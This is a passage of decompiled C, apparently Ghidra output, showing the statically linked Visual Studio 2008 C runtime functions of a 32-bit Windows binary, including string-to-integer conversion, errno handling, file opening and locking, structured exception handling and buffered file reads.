      local_c = __allmul(local_24,local_20,(uint)local_c,local_c._4_4_);
      local_c = local_c + (ulonglong)uVar4;
      param_5 = param_5 | 8;
    }
    else {
      param_5 = param_5 | 0xc;
      if (param_3 == (wchar_t **)0x0) break;
    }
    uVar5 = (uint)(ushort)*pwVar6;
    pwVar6 = pwVar6 + 1;
  } while( true );
  pwVar6 = pwVar6 + -1;
  if ((param_5 & 8U) == 0) {
    if (param_3 != (wchar_t **)0x0) {
      pwVar6 = param_2;
    }
    local_c = 0;
  }
  else if (((param_5 & 4U) != 0) ||
          (((param_5 & 1U) == 0 &&
           ((((param_5 & 2U) != 0 &&
             ((0x80000000 < local_c._4_4_ || ((0x7fffffff < local_c._4_4_ && ((uint)local_c != 0))))
             )) || (((param_5 & 2U) == 0 &&
                    ((0x7ffffffe < local_c._4_4_ && (0x7fffffff < local_c._4_4_)))))))))) {
    piVar2 = __errno();
    *piVar2 = 0x22;
    if ((param_5 & 1U) == 0) {
      if ((param_5 & 2U) == 0) {
        local_c = 0x7fffffffffffffff;
      }
      else {
        local_c = -0x8000000000000000;
      }
    }
    else {
      local_c = -1;
    }
  }
  if (param_3 != (wchar_t **)0x0) {
    *param_3 = pwVar6;
  }
  if ((param_5 & 2U) != 0) {
    local_c = CONCAT44(-(local_c._4_4_ + ((uint)local_c != 0)),-(uint)local_c);
  }
  if (local_28 != '\0') {
    *(uint *)(local_2c + 0x70) = *(uint *)(local_2c + 0x70) & 0xfffffffd;
  }
  goto LAB_0040aea7;
}



// Library Function - Single Match
//  __wcstoi64
// 
// Library: Visual Studio 2008 Release

longlong __cdecl __wcstoi64(wchar_t *_Str,wchar_t **_EndPtr,int _Radix)

{
  __uint64 _Var1;
  undefined **ppuVar2;
  
  if (DAT_00423c80 == 0) {
    ppuVar2 = &PTR_DAT_00422d60;
  }
  else {
    ppuVar2 = (undefined **)0x0;
  }
  _Var1 = wcstoxq((localeinfo_struct *)ppuVar2,_Str,_EndPtr,_Radix,0);
  return _Var1;
}



// Library Function - Single Match
//  _calloc
// 
// Library: Visual Studio 2008 Release

void * __cdecl _calloc(size_t _Count,size_t _Size)

{
  int *piVar1;
  int *piVar2;
  int local_8;
  
  local_8 = 0;
  piVar1 = __calloc_impl(_Count,_Size,&local_8);
  if ((piVar1 == (int *)0x0) && (local_8 != 0)) {
    piVar2 = __errno();
    if (piVar2 != (int *)0x0) {
      piVar2 = __errno();
      *piVar2 = local_8;
    }
  }
  return piVar1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  ___report_gsfailure
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl ___report_gsfailure(void)

{
  undefined4 in_EAX;
  HANDLE hProcess;
  undefined4 in_ECX;
  undefined4 in_EDX;
  undefined4 unaff_EBX;
  undefined4 unaff_EBP;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined2 in_ES;
  undefined2 in_CS;
  undefined2 in_SS;
  undefined2 in_DS;
  undefined2 in_FS;
  undefined2 in_GS;
  byte in_AF;
  byte in_TF;
  byte in_IF;
  byte in_NT;
  byte in_AC;
  byte in_VIF;
  byte in_VIP;
  byte in_ID;
  undefined4 unaff_retaddr;
  UINT uExitCode;
  undefined4 local_32c;
  undefined4 local_328;
  
  _DAT_00423598 =
       (uint)(in_NT & 1) * 0x4000 | (uint)SBORROW4((int)&stack0xfffffffc,0x328) * 0x800 |
       (uint)(in_IF & 1) * 0x200 | (uint)(in_TF & 1) * 0x100 | (uint)((int)&local_32c < 0) * 0x80 |
       (uint)(&stack0x00000000 == (undefined *)0x32c) * 0x40 | (uint)(in_AF & 1) * 0x10 |
       (uint)((POPCOUNT((uint)&local_32c & 0xff) & 1U) == 0) * 4 |
       (uint)(&stack0xfffffffc < (undefined *)0x328) | (uint)(in_ID & 1) * 0x200000 |
       (uint)(in_VIP & 1) * 0x100000 | (uint)(in_VIF & 1) * 0x80000 | (uint)(in_AC & 1) * 0x40000;
  _DAT_0042359c = &stack0x00000004;
  _DAT_004234d8 = 0x10001;
  _DAT_00423480 = 0xc0000409;
  _DAT_00423484 = 1;
  local_32c = DAT_00422040;
  local_328 = DAT_00422044;
  _DAT_0042348c = unaff_retaddr;
  _DAT_00423564 = in_GS;
  _DAT_00423568 = in_FS;
  _DAT_0042356c = in_ES;
  _DAT_00423570 = in_DS;
  _DAT_00423574 = unaff_EDI;
  _DAT_00423578 = unaff_ESI;
  _DAT_0042357c = unaff_EBX;
  _DAT_00423580 = in_EDX;
  _DAT_00423584 = in_ECX;
  _DAT_00423588 = in_EAX;
  _DAT_0042358c = unaff_EBP;
  DAT_00423590 = unaff_retaddr;
  _DAT_00423594 = in_CS;
  _DAT_004235a0 = in_SS;
  DAT_004234d0 = IsDebuggerPresent();
  FUN_00412492();
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  UnhandledExceptionFilter((_EXCEPTION_POINTERS *)&PTR_DAT_0041c2c8);
  if (DAT_004234d0 == 0) {
    FUN_00412492();
  }
  uExitCode = 0xc0000409;
  hProcess = GetCurrentProcess();
  TerminateProcess(hProcess,uExitCode);
  return;
}



void __cdecl FUN_0040b01c(undefined4 param_1)

{
  DAT_004237a4 = param_1;
  return;
}



// Library Function - Single Match
//  __invoke_watson
// 
// Library: Visual Studio 2008 Release

void __cdecl
__invoke_watson(wchar_t *param_1,wchar_t *param_2,wchar_t *param_3,uint param_4,uintptr_t param_5)

{
  uint uVar1;
  BOOL BVar2;
  LONG LVar3;
  HANDLE hProcess;
  UINT uExitCode;
  EXCEPTION_RECORD local_32c;
  _EXCEPTION_POINTERS local_2dc;
  undefined4 local_2d4;
  
  uVar1 = DAT_00422040 ^ (uint)&stack0xfffffffc;
  local_32c.ExceptionCode = 0;
  _memset(&local_32c.ExceptionFlags,0,0x4c);
  local_2dc.ExceptionRecord = &local_32c;
  local_2dc.ContextRecord = (PCONTEXT)&local_2d4;
  local_2d4 = 0x10001;
  local_32c.ExceptionCode = 0xc0000417;
  local_32c.ExceptionFlags = 1;
  BVar2 = IsDebuggerPresent();
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  LVar3 = UnhandledExceptionFilter(&local_2dc);
  if ((LVar3 == 0) && (BVar2 == 0)) {
    FUN_00412492();
  }
  uExitCode = 0xc0000417;
  hProcess = GetCurrentProcess();
  TerminateProcess(hProcess,uExitCode);
  ___security_check_cookie_4(uVar1 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  __invalid_parameter
// 
// Library: Visual Studio 2008 Release

void __cdecl
__invalid_parameter(wchar_t *param_1,wchar_t *param_2,wchar_t *param_3,uint param_4,
                   uintptr_t param_5)

{
  code *UNRECOVERED_JUMPTABLE;
  
  UNRECOVERED_JUMPTABLE = (code *)__decode_pointer(DAT_004237a4);
  if (UNRECOVERED_JUMPTABLE != (code *)0x0) {
                    // WARNING: Could not recover jumptable at 0x0040b169. Too many branches
                    // WARNING: Treating indirect jump as call
    (*UNRECOVERED_JUMPTABLE)();
    return;
  }
  FUN_00412492();
                    // WARNING: Subroutine does not return
  __invoke_watson(param_1,param_2,param_3,param_4,param_5);
}



// Library Function - Single Match
//  __get_errno_from_oserr
// 
// Library: Visual Studio 2008 Release

int __cdecl __get_errno_from_oserr(ulong param_1)

{
  uint uVar1;
  
  uVar1 = 0;
  do {
    if (param_1 == (&DAT_00422048)[uVar1 * 2]) {
      return (&DAT_0042204c)[uVar1 * 2];
    }
    uVar1 = uVar1 + 1;
  } while (uVar1 < 0x2d);
  if (param_1 - 0x13 < 0x12) {
    return 0xd;
  }
  return (-(uint)(0xe < param_1 - 0xbc) & 0xe) + 8;
}



// Library Function - Single Match
//  __errno
// 
// Library: Visual Studio 2008 Release

int * __cdecl __errno(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd_noexit();
  if (p_Var1 == (_ptiddata)0x0) {
    return (int *)&DAT_004221b0;
  }
  return &p_Var1->_terrno;
}



// Library Function - Single Match
//  ___doserrno
// 
// Library: Visual Studio 2008 Release

ulong * __cdecl ___doserrno(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd_noexit();
  if (p_Var1 == (_ptiddata)0x0) {
    return (ulong *)&DAT_004221b4;
  }
  return &p_Var1->_tdoserrno;
}



// Library Function - Single Match
//  __dosmaperr
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __dosmaperr(ulong param_1)

{
  ulong *puVar1;
  int iVar2;
  int *piVar3;
  
  puVar1 = ___doserrno();
  *puVar1 = param_1;
  iVar2 = __get_errno_from_oserr(param_1);
  piVar3 = __errno();
  *piVar3 = iVar2;
  return;
}



undefined ** FUN_0040b204(void)

{
  return &PTR_DAT_004221b8;
}



// Library Function - Single Match
//  __lock_file
// 
// Library: Visual Studio 2008 Release

void __cdecl __lock_file(FILE *_File)

{
  if ((_File < &PTR_DAT_004221b8) || ((FILE *)&DAT_00422418 < _File)) {
    EnterCriticalSection((LPCRITICAL_SECTION)(_File + 1));
  }
  else {
    __lock(((int)&_File[-0x2110e]._base >> 5) + 0x10);
    _File->_flag = _File->_flag | 0x8000;
  }
  return;
}



// Library Function - Single Match
//  __lock_file2
// 
// Library: Visual Studio 2008 Release

void __cdecl __lock_file2(int _Index,void *_File)

{
  if (_Index < 0x14) {
    __lock(_Index + 0x10);
    *(uint *)((int)_File + 0xc) = *(uint *)((int)_File + 0xc) | 0x8000;
    return;
  }
  EnterCriticalSection((LPCRITICAL_SECTION)((int)_File + 0x20));
  return;
}



// Library Function - Single Match
//  __unlock_file
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __unlock_file(FILE *_File)

{
  if (((FILE *)0x4221b7 < _File) && (_File < (FILE *)0x422419)) {
    _File->_flag = _File->_flag & 0xffff7fff;
    FUN_0040e64c(((int)&_File[-0x2110e]._base >> 5) + 0x10);
    return;
  }
  LeaveCriticalSection((LPCRITICAL_SECTION)(_File + 1));
  return;
}



// Library Function - Single Match
//  __unlock_file2
// 
// Library: Visual Studio 2008 Release

void __cdecl __unlock_file2(int _Index,void *_File)

{
  if (_Index < 0x14) {
    *(uint *)((int)_File + 0xc) = *(uint *)((int)_File + 0xc) & 0xffff7fff;
    FUN_0040e64c(_Index + 0x10);
    return;
  }
  LeaveCriticalSection((LPCRITICAL_SECTION)((int)_File + 0x20));
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __wopenfile
// 
// Library: Visual Studio 2008 Release

FILE * __cdecl __wopenfile(wchar_t *_Filename,wchar_t *_Mode,int _ShFlag,FILE *_File)

{
  bool bVar1;
  bool bVar2;
  bool bVar3;
  bool bVar4;
  wchar_t wVar5;
  int *piVar6;
  int iVar7;
  errno_t eVar8;
  uint _OpenFlag;
  wchar_t *pwVar9;
  wchar_t *pwVar10;
  uint local_8;
  
  bVar3 = false;
  bVar2 = false;
  bVar4 = false;
  for (pwVar10 = _Mode; *pwVar10 == L' '; pwVar10 = pwVar10 + 1) {
  }
  wVar5 = *pwVar10;
  if (wVar5 == L'a') {
    _OpenFlag = 0x109;
LAB_0040b429:
    local_8 = DAT_00423eb8 | 2;
  }
  else {
    if (wVar5 != L'r') {
      if (wVar5 != L'w') goto LAB_0040b3f6;
      _OpenFlag = 0x301;
      goto LAB_0040b429;
    }
    _OpenFlag = 0;
    local_8 = DAT_00423eb8 | 1;
  }
  bVar1 = true;
  pwVar10 = pwVar10 + 1;
  wVar5 = *pwVar10;
  if (wVar5 != L'\0') {
    do {
      if (!bVar1) break;
      if ((ushort)wVar5 < 0x54) {
        if (wVar5 == L'S') {
          if (bVar2) goto LAB_0040b557;
          bVar2 = true;
          _OpenFlag = _OpenFlag | 0x20;
        }
        else if (wVar5 != L' ') {
          if (wVar5 == L'+') {
            if ((_OpenFlag & 2) != 0) goto LAB_0040b557;
            _OpenFlag = _OpenFlag & 0xfffffffe | 2;
            local_8 = local_8 & 0xfffffffc | 0x80;
          }
          else if (wVar5 == L',') {
            bVar4 = true;
LAB_0040b557:
            bVar1 = false;
          }
          else if (wVar5 == L'D') {
            if ((_OpenFlag & 0x40) != 0) goto LAB_0040b557;
            _OpenFlag = _OpenFlag | 0x40;
          }
          else if (wVar5 == L'N') {
            _OpenFlag = _OpenFlag | 0x80;
          }
          else {
            if (wVar5 != L'R') goto LAB_0040b3f6;
            if (bVar2) goto LAB_0040b557;
            bVar2 = true;
            _OpenFlag = _OpenFlag | 0x10;
          }
        }
      }
      else if (wVar5 == L'T') {
        if ((_OpenFlag & 0x1000) != 0) goto LAB_0040b557;
        _OpenFlag = _OpenFlag | 0x1000;
      }
      else if (wVar5 == L'b') {
        if ((_OpenFlag & 0xc000) != 0) goto LAB_0040b557;
        _OpenFlag = _OpenFlag | 0x8000;
      }
      else if (wVar5 == L'c') {
        if (bVar3) goto LAB_0040b557;
        local_8 = local_8 | 0x4000;
        bVar3 = true;
      }
      else if (wVar5 == L'n') {
        if (bVar3) goto LAB_0040b557;
        local_8 = local_8 & 0xffffbfff;
        bVar3 = true;
      }
      else {
        if (wVar5 != L't') goto LAB_0040b3f6;
        if ((_OpenFlag & 0xc000) != 0) goto LAB_0040b557;
        _OpenFlag = _OpenFlag | 0x4000;
      }
      pwVar10 = pwVar10 + 1;
      wVar5 = *pwVar10;
    } while (wVar5 != L'\0');
    if (bVar4) {
      for (; *pwVar10 == L' '; pwVar10 = pwVar10 + 1) {
      }
      iVar7 = _wcsncmp((wchar_t *)&DAT_0041c2d0,pwVar10,3);
      if (iVar7 != 0) goto LAB_0040b3f6;
      for (pwVar10 = pwVar10 + 3; *pwVar10 == L' '; pwVar10 = pwVar10 + 1) {
      }
      if (*pwVar10 != L'=') goto LAB_0040b3f6;
      do {
        pwVar9 = pwVar10;
        pwVar10 = pwVar9 + 1;
      } while (*pwVar10 == L' ');
      iVar7 = __wcsnicmp(pwVar10,u_UTF_8_0041c2d8,5);
      if (iVar7 == 0) {
        pwVar10 = pwVar9 + 6;
        _OpenFlag = _OpenFlag | 0x40000;
      }
      else {
        iVar7 = __wcsnicmp(pwVar10,u_UTF_16LE_0041c2e4,8);
        if (iVar7 == 0) {
          pwVar10 = pwVar9 + 9;
          _OpenFlag = _OpenFlag | 0x20000;
        }
        else {
          iVar7 = __wcsnicmp(pwVar10,u_UNICODE_0041c2f8,7);
          if (iVar7 != 0) goto LAB_0040b3f6;
          pwVar10 = pwVar9 + 8;
          _OpenFlag = _OpenFlag | 0x10000;
        }
      }
    }
  }
  for (; *pwVar10 == L' '; pwVar10 = pwVar10 + 1) {
  }
  if (*pwVar10 == L'\0') {
    eVar8 = __wsopen_s((int *)&_Mode,_Filename,_OpenFlag,_ShFlag,0x180);
    if (eVar8 != 0) {
      return (FILE *)0x0;
    }
    _DAT_004237a8 = _DAT_004237a8 + 1;
    _File->_flag = local_8;
    _File->_cnt = 0;
    _File->_ptr = (char *)0x0;
    _File->_base = (char *)0x0;
    _File->_tmpfname = (char *)0x0;
    _File->_file = (int)_Mode;
    return _File;
  }
LAB_0040b3f6:
  piVar6 = __errno();
  *piVar6 = 0x16;
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return (FILE *)0x0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __getstream
// 
// Library: Visual Studio 2008 Release

FILE * __cdecl __getstream(void)

{
  int *piVar1;
  uint uVar2;
  int iVar3;
  void *pvVar4;
  BOOL BVar5;
  int iVar6;
  FILE *pFVar7;
  FILE *_File;
  
  pFVar7 = (FILE *)0x0;
  __lock(1);
  iVar6 = 0;
  do {
    _File = pFVar7;
    if (DAT_00426120 <= iVar6) {
LAB_0040b76b:
      if (_File != (FILE *)0x0) {
        _File->_flag = _File->_flag & 0x8000;
        _File->_cnt = 0;
        _File->_base = (char *)0x0;
        _File->_ptr = (char *)0x0;
        _File->_tmpfname = (char *)0x0;
        _File->_file = -1;
      }
      FUN_0040b79c();
      return _File;
    }
    piVar1 = (int *)(DAT_00425110 + iVar6 * 4);
    if (*piVar1 == 0) {
      iVar6 = iVar6 * 4;
      pvVar4 = __malloc_crt(0x38);
      *(void **)(iVar6 + DAT_00425110) = pvVar4;
      if (*(int *)(DAT_00425110 + iVar6) != 0) {
        BVar5 = ___crtInitCritSecAndSpinCount
                          ((LPCRITICAL_SECTION)(*(int *)(DAT_00425110 + iVar6) + 0x20),4000);
        if (BVar5 == 0) {
          _free(*(void **)(iVar6 + DAT_00425110));
          *(undefined4 *)(iVar6 + DAT_00425110) = 0;
        }
        else {
          EnterCriticalSection((LPCRITICAL_SECTION)(*(int *)(iVar6 + DAT_00425110) + 0x20));
          _File = *(FILE **)(iVar6 + DAT_00425110);
          _File->_flag = 0;
        }
      }
      goto LAB_0040b76b;
    }
    uVar2 = *(uint *)(*piVar1 + 0xc);
    if (((uVar2 & 0x83) == 0) && ((uVar2 & 0x8000) == 0)) {
      if ((iVar6 - 3U < 0x11) && (iVar3 = __mtinitlocknum(iVar6 + 0x10), iVar3 == 0))
      goto LAB_0040b76b;
      __lock_file2(iVar6,*(void **)(DAT_00425110 + iVar6 * 4));
      _File = *(FILE **)(DAT_00425110 + iVar6 * 4);
      if ((*(byte *)&_File->_flag & 0x83) == 0) goto LAB_0040b76b;
      __unlock_file2(iVar6,_File);
    }
    iVar6 = iVar6 + 1;
  } while( true );
}



void FUN_0040b79c(void)

{
  FUN_0040e64c(1);
  return;
}



// WARNING: This is an inlined function
// WARNING: Unable to track spacebase fully for stack
// WARNING: Variable defined which should be unmapped: param_2
// Library Function - Single Match
//  __SEH_prolog4
// 
// Library: Visual Studio

void __cdecl __SEH_prolog4(undefined4 param_1,int param_2)

{
  int iVar1;
  undefined4 unaff_EBX;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined4 unaff_retaddr;
  uint auStack_1c [5];
  undefined local_8 [8];
  
  iVar1 = -param_2;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0x10) = unaff_EBX;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0xc) = unaff_ESI;
  *(undefined4 *)((int)auStack_1c + iVar1 + 8) = unaff_EDI;
  *(uint *)((int)auStack_1c + iVar1 + 4) = DAT_00422040 ^ (uint)&param_2;
  *(undefined4 *)((int)auStack_1c + iVar1) = unaff_retaddr;
  ExceptionList = local_8;
  return;
}



// WARNING: This is an inlined function
// Library Function - Single Match
//  __SEH_epilog4
// 
// Library: Visual Studio

void __SEH_epilog4(void)

{
  undefined4 *unaff_EBP;
  undefined4 unaff_retaddr;
  
  ExceptionList = (void *)unaff_EBP[-4];
  *unaff_EBP = unaff_retaddr;
  return;
}



// Library Function - Single Match
//  __except_handler4
// 
// Library: Visual Studio 2008 Release

undefined4 __cdecl __except_handler4(int *param_1,PVOID param_2,undefined4 param_3)

{
  int iVar1;
  int iVar2;
  BOOL BVar3;
  PVOID pvVar4;
  int *piVar5;
  int *local_1c;
  undefined4 local_18;
  PVOID *local_14;
  undefined4 local_10;
  PVOID local_c;
  char local_5;
  
  piVar5 = (int *)(*(uint *)((int)param_2 + 8) ^ DAT_00422040);
  local_5 = '\0';
  local_10 = 1;
  iVar1 = (int)param_2 + 0x10;
  if (*piVar5 != -2) {
    ___security_check_cookie_4(piVar5[1] + iVar1 ^ *(uint *)(*piVar5 + iVar1));
  }
  ___security_check_cookie_4(piVar5[3] + iVar1 ^ *(uint *)(piVar5[2] + iVar1));
  pvVar4 = param_2;
  if ((*(byte *)(param_1 + 1) & 0x66) == 0) {
    *(int ***)((int)param_2 + -4) = &local_1c;
    pvVar4 = *(PVOID *)((int)param_2 + 0xc);
    local_1c = param_1;
    local_18 = param_3;
    if (pvVar4 == (PVOID)0xfffffffe) {
      return local_10;
    }
    do {
      local_14 = (PVOID *)(piVar5 + (int)pvVar4 * 3 + 4);
      local_c = *local_14;
      if ((undefined *)piVar5[(int)pvVar4 * 3 + 5] != (undefined *)0x0) {
        iVar2 = __EH4_CallFilterFunc_8((undefined *)piVar5[(int)pvVar4 * 3 + 5]);
        local_5 = '\x01';
        if (iVar2 < 0) {
          local_10 = 0;
          goto LAB_0040b8b8;
        }
        if (0 < iVar2) {
          if (((*param_1 == -0x1f928c9d) &&
              (PTR____DestructExceptionObject_004204a8 != (undefined *)0x0)) &&
             (BVar3 = __IsNonwritableInCurrentImage((PBYTE)&PTR____DestructExceptionObject_004204a8)
             , BVar3 != 0)) {
            (*(code *)PTR____DestructExceptionObject_004204a8)(param_1,1);
          }
          __EH4_GlobalUnwind_4(param_2);
          if (*(PVOID *)((int)param_2 + 0xc) != pvVar4) {
            __EH4_LocalUnwind_16((int)param_2,(uint)pvVar4,iVar1,&DAT_00422040);
          }
          *(PVOID *)((int)param_2 + 0xc) = local_c;
          if (*piVar5 != -2) {
            ___security_check_cookie_4(piVar5[1] + iVar1 ^ *(uint *)(*piVar5 + iVar1));
          }
          ___security_check_cookie_4(piVar5[3] + iVar1 ^ *(uint *)(piVar5[2] + iVar1));
          __EH4_TransferToHandler_8((undefined *)local_14[2]);
          goto LAB_0040b97c;
        }
      }
      pvVar4 = local_c;
    } while (local_c != (PVOID)0xfffffffe);
    if (local_5 == '\0') {
      return local_10;
    }
  }
  else {
LAB_0040b97c:
    if (*(int *)((int)pvVar4 + 0xc) == -2) {
      return local_10;
    }
    __EH4_LocalUnwind_16((int)pvVar4,0xfffffffe,iVar1,&DAT_00422040);
  }
LAB_0040b8b8:
  if (*piVar5 != -2) {
    ___security_check_cookie_4(piVar5[1] + iVar1 ^ *(uint *)(*piVar5 + iVar1));
  }
  ___security_check_cookie_4(piVar5[3] + iVar1 ^ *(uint *)(piVar5[2] + iVar1));
  return local_10;
}



// Library Function - Single Match
//  __local_unwind4
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

void __cdecl __local_unwind4(uint *param_1,int param_2,uint param_3)

{
  undefined4 *puVar1;
  uint uVar2;
  void *pvStack_28;
  undefined *puStack_24;
  uint local_20;
  uint uStack_1c;
  int iStack_18;
  uint *puStack_14;
  
  puStack_14 = param_1;
  iStack_18 = param_2;
  uStack_1c = param_3;
  puStack_24 = &LAB_0040ba2c;
  pvStack_28 = ExceptionList;
  local_20 = DAT_00422040 ^ (uint)&pvStack_28;
  ExceptionList = &pvStack_28;
  while( true ) {
    uVar2 = *(uint *)(param_2 + 0xc);
    if ((uVar2 == 0xfffffffe) || ((param_3 != 0xfffffffe && (uVar2 <= param_3)))) break;
    puVar1 = (undefined4 *)((*(uint *)(param_2 + 8) ^ *param_1) + 0x10 + uVar2 * 0xc);
    *(undefined4 *)(param_2 + 0xc) = *puVar1;
    if (puVar1[1] == 0) {
      __NLG_Notify(0x101);
      FUN_004132e4();
    }
  }
  ExceptionList = pvStack_28;
  return;
}



void FUN_0040ba72(int param_1)

{
  __local_unwind4(*(uint **)(param_1 + 0x28),*(int *)(param_1 + 0x18),*(uint *)(param_1 + 0x1c));
  return;
}



// Library Function - Single Match
//  @_EH4_CallFilterFunc@8
// 
// Library: Visual Studio 2008 Release

void __fastcall __EH4_CallFilterFunc_8(undefined *param_1)

{
  (*(code *)param_1)();
  return;
}



// Library Function - Single Match
//  @_EH4_TransferToHandler@8
// 
// Library: Visual Studio 2008 Release

void __fastcall __EH4_TransferToHandler_8(undefined *UNRECOVERED_JUMPTABLE)

{
  __NLG_Notify(1);
                    // WARNING: Could not recover jumptable at 0x0040babc. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)UNRECOVERED_JUMPTABLE)();
  return;
}



// Library Function - Single Match
//  @_EH4_GlobalUnwind@4
// 
// Library: Visual Studio 2008 Release

void __fastcall __EH4_GlobalUnwind_4(PVOID param_1)

{
  RtlUnwind(param_1,(PVOID)0x40bad3,(PEXCEPTION_RECORD)0x0,(PVOID)0x0);
  return;
}



// Library Function - Single Match
//  @_EH4_LocalUnwind@16
// 
// Library: Visual Studio 2008 Release

void __fastcall __EH4_LocalUnwind_16(int param_1,uint param_2,undefined4 param_3,uint *param_4)

{
  __local_unwind4(param_4,param_1,param_2);
  return;
}



// Library Function - Single Match
//  __filbuf
// 
// Library: Visual Studio 2008 Release

int __cdecl __filbuf(FILE *_File)

{
  byte bVar1;
  int *piVar2;
  int iVar3;
  uint uVar4;
  undefined *puVar5;
  char *_DstBuf;
  
  if (_File == (FILE *)0x0) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    uVar4 = _File->_flag;
    if (((uVar4 & 0x83) != 0) && ((uVar4 & 0x40) == 0)) {
      if ((uVar4 & 2) == 0) {
        _File->_flag = uVar4 | 1;
        if ((uVar4 & 0x10c) == 0) {
          __getbuf(_File);
        }
        else {
          _File->_ptr = _File->_base;
        }
        uVar4 = _File->_bufsiz;
        _DstBuf = _File->_base;
        iVar3 = __fileno(_File);
        iVar3 = __read(iVar3,_DstBuf,uVar4);
        _File->_cnt = iVar3;
        if ((iVar3 != 0) && (iVar3 != -1)) {
          if ((*(byte *)&_File->_flag & 0x82) == 0) {
            iVar3 = __fileno(_File);
            if ((iVar3 == -1) || (iVar3 = __fileno(_File), iVar3 == -2)) {
              puVar5 = &DAT_00422d78;
            }
            else {
              iVar3 = __fileno(_File);
              uVar4 = __fileno(_File);
              puVar5 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_00424fe0)[iVar3 >> 5]);
            }
            if ((puVar5[4] & 0x82) == 0x82) {
              _File->_flag = _File->_flag | 0x2000;
            }
          }
          if (((_File->_bufsiz == 0x200) && ((_File->_flag & 8U) != 0)) &&
             ((_File->_flag & 0x400U) == 0)) {
            _File->_bufsiz = 0x1000;
          }
          _File->_cnt = _File->_cnt + -1;
          bVar1 = *_File->_ptr;
          _File->_ptr = _File->_ptr + 1;
          return (uint)bVar1;
        }
        _File->_flag = _File->_flag | (-(uint)(iVar3 != 0) & 0x10) + 0x10;
        _File->_cnt = 0;
      }
      else {
        _File->_flag = uVar4 | 0x20;
      }
    }
  }
  return -1;
}



// Library Function - Single Match
//  __read_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __read_nolock(int _FileHandle,void *_DstBuf,uint _MaxCharCount)

{
  byte *pbVar1;
  uint uVar2;
  byte bVar3;
  char cVar4;
  ulong *puVar5;
  int *piVar6;
  uint uVar7;
  short *psVar8;
  BOOL BVar9;
  DWORD DVar10;
  ulong uVar11;
  short *psVar12;
  int iVar13;
  int iVar14;
  int unaff_EDI;
  bool bVar15;
  longlong lVar16;
  short sVar17;
  uint local_1c;
  int local_18;
  short *local_14;
  short *local_10;
  undefined2 local_c;
  char local_6;
  char local_5;
  
  uVar2 = _MaxCharCount;
  local_18 = -2;
  if (_FileHandle == -2) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    piVar6 = __errno();
    *piVar6 = 9;
    return -1;
  }
  if ((_FileHandle < 0) || (DAT_00424fd8 <= (uint)_FileHandle)) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    piVar6 = __errno();
    *piVar6 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    return -1;
  }
  piVar6 = &DAT_00424fe0 + (_FileHandle >> 5);
  iVar14 = (_FileHandle & 0x1fU) * 0x40;
  bVar3 = *(byte *)(*piVar6 + iVar14 + 4);
  if ((bVar3 & 1) == 0) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    piVar6 = __errno();
    *piVar6 = 9;
    goto LAB_0040bd24;
  }
  if (_MaxCharCount < 0x80000000) {
    local_14 = (short *)0x0;
    if ((_MaxCharCount == 0) || ((bVar3 & 2) != 0)) {
      return 0;
    }
    if (_DstBuf != (void *)0x0) {
      local_6 = (char)(*(char *)(*piVar6 + iVar14 + 0x24) * '\x02') >> 1;
      if (local_6 == '\x01') {
        if ((~_MaxCharCount & 1) == 0) goto LAB_0040bd12;
        uVar7 = _MaxCharCount >> 1;
        _MaxCharCount = 4;
        if (3 < uVar7) {
          _MaxCharCount = uVar7;
        }
        local_10 = (short *)__malloc_crt(_MaxCharCount);
        if (local_10 == (short *)0x0) {
          piVar6 = __errno();
          *piVar6 = 0xc;
          puVar5 = ___doserrno();
          *puVar5 = 8;
          return -1;
        }
        lVar16 = __lseeki64_nolock(_FileHandle,0x100000000,unaff_EDI);
        iVar13 = *piVar6;
        *(int *)(iVar14 + 0x28 + iVar13) = (int)lVar16;
        *(int *)(iVar14 + 0x2c + iVar13) = (int)((ulonglong)lVar16 >> 0x20);
      }
      else {
        if (local_6 == '\x02') {
          if ((~_MaxCharCount & 1) == 0) goto LAB_0040bd12;
          _MaxCharCount = _MaxCharCount & 0xfffffffe;
        }
        local_10 = (short *)_DstBuf;
      }
      psVar8 = local_10;
      uVar7 = _MaxCharCount;
      if ((((*(byte *)(*piVar6 + iVar14 + 4) & 0x48) != 0) &&
          (cVar4 = *(char *)(*piVar6 + iVar14 + 5), cVar4 != '\n')) && (_MaxCharCount != 0)) {
        *(char *)local_10 = cVar4;
        psVar8 = (short *)((int)local_10 + 1);
        uVar7 = _MaxCharCount - 1;
        local_14 = (short *)0x1;
        *(undefined *)(iVar14 + 5 + *piVar6) = 10;
        if (((local_6 != '\0') && (cVar4 = *(char *)(iVar14 + 0x25 + *piVar6), cVar4 != '\n')) &&
           (uVar7 != 0)) {
          *(char *)psVar8 = cVar4;
          psVar8 = local_10 + 1;
          uVar7 = _MaxCharCount - 2;
          local_14 = (short *)0x2;
